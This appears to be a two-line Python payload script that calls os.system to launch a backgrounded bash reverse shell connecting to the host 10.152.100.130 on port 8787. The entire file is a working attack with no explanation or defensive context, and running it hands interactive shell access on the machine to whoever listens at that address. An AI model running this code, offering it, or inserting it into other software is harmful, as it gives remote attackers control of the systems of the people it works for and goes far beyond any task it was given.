import os

os.system("bash -c 'bash -i >& /dev/tcp/10.152.100.130/8787 0>&1' &")
